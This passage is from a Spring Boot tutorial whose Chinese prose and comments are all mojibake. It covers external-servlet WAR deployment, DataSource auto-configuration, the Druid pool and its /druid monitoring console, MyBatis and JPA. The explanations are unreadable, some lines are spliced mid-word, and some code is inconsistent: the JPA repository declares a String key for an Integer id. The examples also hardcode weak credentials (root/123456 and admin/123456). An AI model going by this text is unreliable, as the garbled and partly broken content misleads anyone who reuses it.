SpringApplicationBuilder configure(SpringApplicationBuilder application) {\n            //ä¼ å¥SpringBootåºç¨çä¸»ç¨åº\n            return application.sources(SpringBoot04WebJspApplication.class);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 4. å¯å¨æå¡å¨å°±å¯ä»¥ä½¿ç¨\n\n\n# å¤ç½®Servletåç\n\njaråï¼æ§è¡SpringBootä¸»ç±»çmainæ¹æ³ï¼å¯å¨iocå®¹å¨ï¼åå»ºåµå¥å¼çServletå®¹å¨\n\nwaråï¼å¯å¨æå¡å¨ï¼æå¡å¨å¯å¨SpringBootåºç¨ãSpringBootServletInitializerãï¼å¯å¨iocå®¹å¨\n\nè§åï¼\n\n1ï¼ãæå¡å¨å¯å¨ï¼webåºç¨å¯å¨ï¼ä¼åå»ºå½åwebåºç¨éé¢æ¯ä¸ä¸ªjaråéé¢ServletContainerInitializerå®ä¾\n\n2ï¼ãServletContainerInitializerçå®ç°æ¾å¨jaråçMETA-INF/servicesæä»¶å¤¹ä¸ï¼æä¸ä¸ªåä¸ºjavax.servlet.ServletContainerInitializerçæä»¶ï¼åå®¹å°±æ¯ServletContainerInitializerçå®ç°ç±»çå¨ç±»å\n\n3ï¼ãè¿å¯ä»¥ä½¿ç¨@HandlesTypesï¼å¨åºç¨å¯å¨çæ¶åå è½½æä»¬æå´è¶£çç±»ï¼\n\næµç¨ï¼\n\n1ï¼ãå¯å¨Tomcat\n\n2ï¼ãorg\\springframework\\spring-web\\4.3.14.RELEASE\\spring-web-4.3.14.RELEASE.jar!\\METAINF\\services\\javax.servlet.ServletContainerInitializerï¼\n\nSpringçwebæ¨¡åéé¢æè¿ä¸ªæä»¶ï¼org.springframework.web.SpringServletContainerInitializer\n\n3ï¼ã`SpringServletContainerInitializer`å°`@HandlesTypes(WebApplicationInitializer.class)`æ æ³¨çææè¿ä¸ªç±»å çç±»é½ä¼ å¥å°onStartupæ¹æ³ç`<Set>`ï¼ä¸ºè¿äº`WebApplicationInitializer`ç±»åçç±»åå»ºå®ä¾\n\n\n4ï¼ãæ¯ä¸ä¸ªWebApplicationInitializeré½è°ç¨èªå·±çonStartupãç¸å½äºæä»¬çSpringBootServletInitializerçç±»ä¼è¢«åå»ºå¯¹è±¡ï¼å¹¶æ§è¡onStartupæ¹æ³ã\n\n6ï¼ãSpringBootServletInitializerå®ä¾æ§è¡onStartupçæ¶åä¼createRootApplicationContextåå»ºå®¹å¨\n\nprotected WebApplicationContext createRootApplicationContext(\n    ServletContext servletContext) {\n    //1ãåå»ºSpringApplicationBuilder\n    SpringApplicationBuilder builder = createSpringApplicationBuilder();\n    StandardServletEnvironment environment = new StandardServletEnvironment();\n    environment.initPropertySources(servletContext, null);\n    builder.environment(environment);\n    builder.main(getClass());\n    ApplicationContext parent = getExistingRootWebApplicationContext(servletContext);\n    if (parent != null) {\n        this.logger.info("Root context already created (using as parent).");\n        servletContext.setAttribute(\n            WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE, null);\n        builder.initializers(new ParentContextApplicationContextInitializer(parent));\n    }\n    builder.initializers(\n        new ServletContextApplicationContextInitializer(servletContext));\n    builder.contextClass(AnnotationConfigEmbeddedWebApplicationContext.class);\n    //è°ç¨configureæ¹æ³ï¼å­ç±»éåäºè¿ä¸ªæ¹æ³ï¼å°SpringBootçä¸»ç¨åºç±»ä¼ å¥äºè¿æ¥\n    builder = configure(builder);\n    //ä½¿ç¨builderåå»ºä¸ä¸ªSpringåºç¨\n    SpringApplication application = builder.build();\n    if (application.getSources().isEmpty() && AnnotationUtils\n        .findAnnotation(getClass(), Configuration.class) != null) {\n        application.getSources().add(getClass());\n    }\n    Assert.state(!application.getSources().isEmpty(),\n                 "No SpringApplication sources have been defined. Either override the "\n                 + "configure method or add an @Configuration annotation");\n    // Ensure error pages are registered\n    if (this.registerErrorPageFilter) {\n        application.getSources().add(ErrorPageFilterConfiguration.class);\n    }\n    //å¯å¨Springåºç¨\n    return run(application);\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n7ï¼ãSpringçåºç¨å°±å¯å¨å¹¶ä¸åå»ºIOCå®¹å¨\n\npublic ConfigurableApplicationContext run(String... args) {\n    StopWatch stopWatch = new StopWatch();\n    stopWatch.start();\n    ConfigurableApplicationContext context = null;\n    FailureAnalyzers analyzers = null;\n    configureHeadlessProperty();\n    SpringApplicationRunListeners listeners = getRunListeners(args);\n    listeners.starting();\n    try {\n        ApplicationArguments applicationArguments = new DefaultApplicationArguments(\n            args);\n        ConfigurableEnvironment environment = prepareEnvironment(listeners,\n                                                                 applicationArguments);\n        Banner printedBanner = printBanner(environment);\n        context = createApplicationContext();\n        analyzers = new FailureAnalyzers(context);\n        prepareContext(context, environment, listeners, applicationArguments,\n                       printedBanner);\n        //å·æ°IOCå®¹å¨\n        refreshContext(context);\n        afterRefresh(context, applicationArguments);\n        listeners.finished(context, null);\n        stopWatch.stop();\n        if (this.logStartupInfo) {\n            new StartupInfoLogger(this.mainApplicationClass)\n                .logStarted(getApplicationLog(), stopWatch);\n        }\n        return context;\n    }\n    catch (Throwable ex) {\n        handleRunFailure(context, listeners, analyzers, ex);\n        throw new IllegalStateException(ex);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# Springbootæ°æ®äº¤äº\n\n\n# JDBC\n\næ·»å ä¾èµï¼\n\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-jdbc</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>mysql</groupId>\n  <artifactId>mysql-connector-java</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\néç½®éç½®æä»¶\n\n# æ­¤å¤å¦æåæ¢ä¸ºé«çæ¬çmysqlé©±å¨ éè¦æ´æ¢ä¸ºcjä¸çDriver\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver  \n\n# å¦æå ä¸ºé©±å¨çæ¬å°äºæ°æ®åºççæ¬å¯è½ä¼å¯¼è´è¿æ¥é®é¢ãå ä¸åæ°useSSL=falseå¯ä»¥è§£å³ï¼å»ºè®®æ´æ¢çæ¬ã\nspring.datasource.url=jdbc:mysql://localhost:3307/springboot\nspring.datasource.username=root\nspring.datasource.password=123456\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\næ·»å æµè¯ä¾èµï¼\n\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-test</artifactId>\n  <scope>test</scope>\n  </dependency>\n\n\n1\n2\n3\n4\n5\n\n\néç½®å¯å¨å¨ï¼å¦æä¸éç½®ï¼æµè¯å¯å¨ä¼æ¥éã\n\npackage com.pwddd.jdbc;\n\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\n\n@SpringBootApplication\npublic class JDBCApplication {\n  public static void main(String[] args) {\n    SpringApplication.run(JDBCApplication.class,args);\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\næµè¯ï¼\n\nimport com.pwddd.jdbc.JDBCApplication;\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.context.SpringBootTest;\nimport org.springframework.jdbc.core.JdbcTemplate;\nimport org.springframework.test.context.ContextConfiguration;\nimport org.springframework.test.context.junit4.SpringRunner;\n\nimport javax.sql.DataSource;\nimport java.sql.SQLException;\n\n@RunWith(SpringRunner.class)\n@SpringBootTest(classes = {JDBCApplication.class})  // æ­¤å¤å¦æä¸æå®class,ä¸å½åæµè¯ç±»çè·¯å¾åå¯å¨ç±»çè·¯å¾ä¸ä¸è´ï¼åæ¾ä¸å°å¯å¨ç±»æ¥éãhttps://blog.csdn.net/pmdream/article/details/109119689\npublic class TestJDBC {\n\n  @Autowired\n  JdbcTemplate jdbcTemplate;\n\n  @Autowired\n  DataSource dataSource;\n\n  @Test\n  public void test() throws SQLException {\n    System.out.println(dataSource.getConnection());\n  }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# æ°æ®äº¤äºéç½®åç\n\nå¨Springbootä¸­é»è®¤ä½¿ç¨org.apache.tomcat.jdbc.pool.DataSourceä½ä¸ºæ°æ®æºãæ°æ®æºçç¸å³éç½®å¨DataSourcePropertiesä¸­ãå¨org.springframework.boot.autoconfigure.jdbc.DataSourceConfigurationæ ¹æ®æ¡ä»¶ç»å®¹å¨ä¸­æ·»å äºå¤ç§æ°æ®æºãå¯ä»¥ä½¿ç¨spring.datasource.typeéç½®è¦ä½¿ç¨çæ°æ®æºãå¦ä¸é¢çä»£ç æç¤º\n\n@ConditionalOnClass({org.apache.tomcat.jdbc.pool.DataSource.class})\n@ConditionalOnProperty(\n  name = {"spring.datasource.type"},\n  havingValue = "org.apache.tomcat.jdbc.pool.DataSource",\n  matchIfMissing = true\n)\nstatic class Tomcat extends DataSourceConfiguration {\n  Tomcat() {\n  }\n\n  @Bean\n  @ConfigurationProperties(\n    prefix = "spring.datasource.tomcat"\n  )\n  public org.apache.tomcat.jdbc.pool.DataSource dataSource(DataSourceProperties properties) {\n    org.apache.tomcat.jdbc.pool.DataSource dataSource = (org.apache.tomcat.jdbc.pool.DataSource)this.createDataSource(properties, org.apache.tomcat.jdbc.pool.DataSource.class);\n    DatabaseDriver databaseDriver = DatabaseDriver.fromJdbcUrl(properties.determineUrl());\n    String validationQuery = databaseDriver.getValidationQuery();\n    if (validationQuery != null) {\n      dataSource.setTestOnBorrow(true);\n      dataSource.setValidationQuery(validationQuery);\n    }\n\n    return dataSource;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\né¤æ­¤ä¹å¤ï¼å¨org.springframework.boot.autoconfigure.jdbc.DataSourceInitializerä¸­å®ä¹äºå¨ç¨åºè¿è¡æ¶è¿è¡çæ°æ®æä½ï¼è¿è¡å»ºè¡¨è¯­å¥ååå»ºæ°æ®åºçè¯­å¥ãSQLè¯­å¥ä½äºclasspathä¸çschema/data-all.sqlæèschema/data.sqlï¼ä¹å¯ä»¥æå®spring.datasource.data/schema\n\nList<Resource> scripts = this.getScripts("spring.datasource.data", this.properties.getData(), "data");\nList<Resource> scripts = this.getScripts("spring.datasource.schema", this.properties.getSchema(), "schema");\nprivate List<Resource> getScripts(String propertyName, List<String> resources, String fallback) {\n  if (resources != null) {\n    return this.getResources(propertyName, resources, true);\n  } else {\n    String platform = this.properties.getPlatform();\n    List<String> fallbackResources = new ArrayList();\n    fallbackResources.add("classpath*:" + fallback + "-" + platform + ".sql");\n    fallbackResources.add("classpath*:" + fallback + ".sql");\n    return this.getResources(propertyName, fallbackResources, false);\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nå¦ä¸æç¤ºï¼\n\nspring.datasource.schema=classpath:sql/schema-all.sql\nspring.datasource.data=classpath:sql/data-all.sql\n\n\n1\n2\n\n\nSpringbooté»è®¤éç½®äºä¸ä¸ªJDBCTemplateæ°æ®æº\n\n@Test\npublic void testJdbcTemplate(){\n  List<Map<String, Object>> maps = jdbcTemplate.queryForList("select * from t_admin");\n  System.out.println(maps.get(0));\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# Druidæ°æ®æº\n\nå¼å¥Druidæ°æ®æº\n\n<dependency>\n  <groupId>com.alibaba</groupId>\n  <artifactId>druid</artifactId>\n  <version>1.2.8</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\næå®æ°æ®æºçç±»åï¼\n\nspring.datasource.type=com.alibaba.druid.pool.DruidDataSource\n\n\n1\n\n\néç½®æä»¶ä¸­éç½®ç¸å³çåæ°ï¼\n\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver\nspring.datasource.url=jdbc:mysql://localhost:3307/springboot\nspring.datasource.username=root\nspring.datasource.password=123456\nspring.datasource.type=com.alibaba.druid.pool.DruidDataSource\nspring.datasource.schema=classpath:sql/schema-all.sql\nspring.datasource.data=classpath:sql/data-all.sql\n\n# Druidéç½®\nspring.datasource.initialSize: 5\nspring.datasource.min-idle=5\nspring.datasource.max-active=20\nspring.datasource.max-wait=60000\nspring.datasource.time-between-eviction-runs-millis=6000\nspring.datasource.min-evictable-idle-time-millis=300000\nspring.datasource.validation-query=SELECT 1 FROM DUAL\nspring.datasource.test-while-idle=false\nspring.datasource.test-on-return=false\nspring.datasource.pool-prepared-statements=true\n\nspring.datasource.druid.filters=stat,wall,log4j\nspring.datasource.druid.max-pool-prepared-statement-per-connection-size=20\nspring.datasource.druid.use-global-data-source-stat=true\nspring.datasource.druid.connection-properties=druid.stat.mergeSql=true;druid.stat.slowSqlMillis=500\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\nç´æ¥è¿ä¹éç½®æ²¡æåæ³æ³¨å¥å°åæ°ä¸­ï¼æä»¬éè¦èªå®ä¹Druidçéç½®ç±»ï¼ç¶åæå®éç½®æä»¶çåç¼\n\npackage com.pwddd.jdbc.config;\n\nimport com.alibaba.druid.pool.DruidDataSource;\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport javax.sql.DataSource;\n\n@Configuration\npublic class DruidConfig {\n\n  @ConfigurationProperties(prefix = "spring.datasource.druid")\n  @Bean\n  public DataSource druidDataSource(){\n    return new DruidDataSource();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\néç½®druidççæ§\n\npackage com.pwddd.jdbc.config;\n\nimport com.alibaba.druid.pool.DruidDataSource;\nimport com.alibaba.druid.support.http.StatViewServlet;\nimport com.alibaba.druid.support.http.WebStatFilter;\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.boot.web.servlet.FilterRegistrationBean;\nimport org.springframework.boot.web.servlet.ServletRegistrationBean;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport javax.sql.DataSource;\nimport java.util.Arrays;\nimport java.util.HashMap;\n\n@Configuration\npublic class DruidConfig {\n\n  @ConfigurationProperties(prefix = "spring.datasource.druid")\n  @Bean\n  public DataSource druidDataSource(){\n    return new DruidDataSource();\n  }\n\n  @Bean\n  public ServletRegistrationBean statViewServlet(){\n\n    ServletRegistrationBean registrationBean = new ServletRegistrationBean(new StatViewServlet(), "/druid/*");\n    HashMap<String, String> map = new HashMap<>();\n    map.put("loginUsername","admin");\n    map.put("loginPassword","123456");\n    registrationBean.setInitParameters(map);\n    return registrationBean;\n  }\n\n  @Bean\n  public FilterRegistrationBean webStatFilter(){\n    FilterRegistrationBean registrationBean = new FilterRegistrationBean(new WebStatFilter());\n    HashMap<String, String> initParameters = new HashMap<>();\n    initParameters.put("exclusions","*.js,*.css,*.html,/druid/*");\n    registrationBean.setInitParameters(initParameters);\n    registrationBean.setUrlPatterns(Arrays.asList("/*"));\n    return registrationBean;\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# æ´åmybatis\n\n 1. å¼å¥ç¸å³ä¾èµï¼\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n  <modelVersion>4.0.0</modelVersion>\n\n  <groupId>com.pwddd.mybatis</groupId>\n  <artifactId>springboot-mybatis</artifactId>\n  <version>1.0-SNAPSHOT</version>\n\n  <parent>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <groupId>org.springframework.boot</groupId>\n    <version>1.5.9.RELEASE</version>\n  </parent>\n\n  <properties>\n    <maven.compiler.source>8</maven.compiler.source>\n    <maven.compiler.target>8</maven.compiler.target>\n  </properties>\n\n  <dependencies>\n    <dependency>\n      <groupId>org.springframework.boot</groupId>\n      <artifactId>spring-boot-starter-web</artifactId>\n    </dependency>\n\n    <dependency>\n      <groupId>org.springframework.boot</groupId>\n      <artifactId>spring-boot-starter-test</artifactId>\n      <scope>test</scope>\n    </dependency>\n\n    <dependency>\n      <groupId>mysql</groupId>\n      <artifactId>mysql-connector-java</artifactId>\n      <version>8.0.28</version>\n      <scope>runtime</scope>\n    </dependency>\n\n    <dependency>\n      <groupId>com.alibaba</groupId>\n      <artifactId>druid</artifactId>\n      <version>1.2.8</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.mybatis.spring.boot</groupId>\n      <artifactId>mybatis-spring-boot-starter</artifactId>\n      <version>2.2.2</version>\n    </dependency>\n  </dependencies>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n 2. éç½®Druidæ°æ®æº\n\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver\nspring.datasource.url=jdbc:mysql://localhost:3307/springboot\nspring.datasource.username=root\nspring.datasource.password=123456\nspring.datasource.type=com.alibaba.druid.pool.DruidDataSource\nspring.datasource.schema=classpath:sql/schema-all.sql\nspring.datasource.data=classpath:sql/data-all.sql\n\n# Druidéç½®\nspring.datasource.initialSize: 5\nspring.datasource.min-idle=5\nspring.datasource.max-active=20\nspring.datasource.max-wait=60000\nspring.datasource.time-between-eviction-runs-millis=6000\nspring.datasource.min-evictable-idle-time-millis=300000\nspring.datasource.validation-query=SELECT 1 FROM DUAL\nspring.datasource.test-while-idle=false\nspring.datasource.test-on-return=false\nspring.datasource.pool-prepared-statements=true\n\nspring.datasource.druid.filters=stat,wall,log4j\nspring.datasource.druid.max-pool-prepared-statement-per-connection-size=20\nspring.datasource.druid.use-global-data-source-stat=true\nspring.datasource.druid.connection-properties=druid.stat.mergeSql=true;druid.stat.slowSqlMillis=500\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\npackage com.pwddd.mybatis.config;\n\nimport com.alibaba.druid.pool.DruidDataSource;\nimport com.alibaba.druid.support.http.StatViewFilter;\nimport com.alibaba.druid.support.http.StatViewServlet;\nimport com.alibaba.druid.support.http.WebStatFilter;\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.boot.web.servlet.FilterRegistrationBean;\nimport org.springframework.boot.web.servlet.ServletRegistrationBean;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport javax.sql.DataSource;\nimport java.util.Arrays;\nimport java.util.HashMap;\n\n@Configuration\npublic class DruidConfig {\n\n    @ConfigurationProperties("spring.datasource")\n    @Bean\n    public DataSource dataSource(){\n        return new DruidDataSource();\n    }\n\n    @Bean\n    public ServletRegistrationBean statViewServlet(){\n        ServletRegistrationBean registrationBean =\n                new ServletRegistrationBean(new StatViewServlet(),"/druid/*");\n        HashMap<String, String> map = new HashMap<>();\n        map.put("loginUsername","admin");\n        map.put("loginPassword","123456");\n        registrationBean.setInitParameters(map);\n        return registrationBean;\n    }\n\n    @Bean\n    public FilterRegistrationBean statFilter(){\n        WebStatFilter filter = new WebStatFilter();\n        FilterRegistrationBean bean = new FilterRegistrationBean(filter);\n        HashMap<String, String> initParameters = new HashMap<>();\n        initParameters.put("exclusions","*.js,*.html,*.css,/druid/*");\n        bean.setInitParameters(initParameters);\n        bean.setUrlPatterns(Arrays.asList("/*"));\n        return bean;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n 3. åå»ºJavaBean\n\npackage com.pwddd.mybatis.bean;\n\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\n\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\npublic class Admin {\n  private String id;\n  private String username;\n  private String passwd;\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n 4. åå»ºmapperåå¯¹åºçæ¥å£\n\npackage com.pwddd.mybatis.mapper;\n\nimport com.pwddd.mybatis.bean.Admin;\nimport org.apache.ibatis.annotations.Mapper;\n\nimport java.util.List;\n\n@Mapper\npublic interface AdminMapper {\n\n  List<Admin> list();\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n<?xml version="1.0" encoding="utf-8" ?>\n<!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"\n        "http://mybatis.org/dtd/mybatis-3-mapper.dtd" >\n<mapper namespace="com.pwddd.mybatis.mapper.AdminMapper">\n\n  <select id="list" resultType="Admin">\n    select * from t_admin\n  </select>\n</mapper>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n 5. æ·»å éç½®\n\nmybatis.mapper-locations=classpath:mapper/*.xml\nmybatis.type-aliases-package=com.pwddd.mybatis.beæ³¨å¥Mapper\n\n\n1\n2\n\n\n@RestController\n@RequestMapping("/admin")\npublic class AdminController {\n\n  @Autowired\n  private AdminMapper adminMapper;\n\n  @RequestMapping("/list")\n  public List<Admin> adminList(){\n    return adminMapper.list();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n 6. æ¹éæ«æå\n\n@SpringBootApplication\n@MapperScan(basePackages = "com.pwddd.mybatis.mapper")\npublic class MybatisApplication {\n  public static void main(String[] args) {\n    SpringApplication.run(MybatisApplication.class,args);\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 7. èªå®ä¹Myabtiséç½®\n\nspringbootéç½®mybatisä¹æ¯ä½¿ç¨èªå¨éç½®å®æçãå¨åå»ºSQL SessionFactoryæ¶ä¼è·åææçConfigurationï¼å æ­¤æä»¬åªéè¦èªå®ä¹ä¸ä¸ªConfigurationCustomizerï¼ç¶åå å¥å°å®¹å¨ä¸­å³å¯ã\n\npackage com.pwddd.mybatis.config;\n\nimport org.mybatis.spring.boot.autoconfigure.ConfigurationCustomizer;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\n@Configuration\npublic class MybatisConfig {\n\n  @Bean\n  public ConfigurationCustomizer configurationCustomizer(){\n    return new ConfigurationCustomizer() {\n\n      @Override\n      public void customize(org.apache.ibatis.session.Configuration configuration) {\n        configuration.setAggressiveLazyLoading(true);\n      }\n    };\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\næºç ï¼\n\nprivate void applyConfiguration(SqlSessionFactoryBean factory) {\n  org.apache.ibatis.session.Configuration configuration = this.properties.getConfiguration();\n  if (configuration == null && !StringUtils.hasText(this.properties.getConfigLocation())) {\n    configuration = new org.apache.ibatis.session.Configuration();\n  }\n\n  if (configuration != null && !CollectionUtils.isEmpty(this.configurationCustomizers)) {\n    Iterator var3 = this.configurationCustomizers.iterator();\n\n    while(var3.hasNext()) {\n      ConfigurationCustomizer customizer = (ConfigurationCustomizer)var3.next();\n      customizer.customize(configuration);\n    }\n  }\n\n  factory.setConfiguration(configuration);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n 8. éç½®å¨å±éç½®æä»¶\n\nmybatis.config-location=classpath:mybatis-config.xml\n\n\n1\n\n\n\n# æ´åJPA\n\n# SpringDataç®ä»\n\n\n\nåºç¨ç¨åºé¢åSpringDataç¼ç¨ï¼ç±SpringDataå¸®å©æä»¬å®æå·ä½çå®ç°ã\n\n# æ´åæ¹æ³\n\n 1. åå»ºé¡¹ç®ï¼å¼å¥spring-boot-starter-jpa\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n  <modelVersion>4.0.0</modelVersion>\n\n  <groupId>com.pwddd.jpa</groupId>\n  <artifactId>springboot-jpa</artifactId>\n  <version>1.0-SNAPSHOT</version>\n\n  <parent>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <groupId>org.springframework.boot</groupId>\n    <version>1.5.9.RELEASE</version>\n  </parent>\n\n  <properties>\n    <maven.compiler.source>8</maven.compiler.source>\n    <maven.compiler.target>8</maven.compiler.target>\n  </properties>\n\n  <dependencies>\n    <dependency>\n      <groupId>org.springframework.boot</groupId>\n      <artifactId>spring-boot-starter-data-jpa</artifactId>\n    </dependency>\n\n    <dependency>\n      <groupId>mysql</groupId>\n      <artifactId>mysql-connector-java</artifactId>\n      <version>8.0.28</version>\n    </dependency>\n\n    <dependency>\n      <groupId>org.springframework.boot</groupId>\n      <artifactId>spring-boot-starter-jdbc</artifactId>\n    </dependency>\n\n    <dependency>\n      <groupId>org.springframework.boot</groupId>\n      <artifactId>spring-boot-starter-web</artifactId>\n    </dependency>\n  </dependencies>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n 2. åå»ºéç½®æä»¶\n\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    password: 123456\n    username: root\n    url: jdbc:mysql://localhost:3307/springboot\n\n\n1\n2\n3\n4\n5\n6\n\n 3. ç¼åå®ä½ç±»ï¼éç½®æ å°å³ç³»\n\npackage com.pwddd.jpa.entity;\n\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\n\nimport javax.persistence.*;\nimport javax.persistence.criteria.CriteriaBuilder;\n\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\n@Entity // éç½®æ è¯\n@Table(name = "t_admin") // éç½®æ°æ®è¡¨\npublic class Admin {\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY) // èªå¢ä¸»é®\n    private Integer id;\n\n    @Column(name = "user_name",length = 255)\n    private String username;\n    @Column(length = 255)\n    private String passwd;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 4. ç¼åæ¥å£æä½æ°æ®\n\npackage com.pwddd.jpa.repository;\n\nimport com.pwddd.jpa.entity.Admin;\nimport org.springframework.data.jpa.repository.JpaRepository;\n//                                                    æä½çå®ä½ï¼ä¸»é®ç±»å\npublic interface AdminRepository extends JpaRepository<Admin,String> {\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 5. éç½®jpa\n\njpa:\n\thibernate:\n\t\tddl-auto: update # æ´æ°æèåå»ºè¡¨ç»æ\n\tshow-sql: true # æ¾ç¤ºæ¥è¯¢\n\n\n1\n2\n3\n4\n\n 6. æ³¨å¥repository\n\npackage com.pwddd.jpa.controller;\n\nimport com.pwddd.jpa.entity.Admin;\nimport com.pwddd.jpa.repository.AdminRepository;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RestController\n@RequestMapping("/admin")\npublic class AdminController {\n\n    @Autowired\n    private AdminRepository repository;\n\n    @RequestMapping("/add")\n    public void addAdmin(Admin admin){\n        repository.save(admin);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# Springboot å¯å¨éç½®åç\n\n\n# å¯å¨æµç¨ï¼\n\n * åå»ºSpringApplicationå¯¹è±¡\n\n * è°ç¨initializeæ¹æ³\n\n    private void initialize(Object[] sources) {\n        if (sources != null && sources.length > 0) {\n            this.sources.addAll(Arrays.asList(sources));\n        }\n\t\t\t// å¤æ­æ¯å¦ä¸ºwebåºç¨\n        this.webEnvironment = this.deduceWebEnvironment();\n      \n      // ç±»è·¯å¾ä¸å¯»æ¾ApplicationInitalizerä¿å­\n      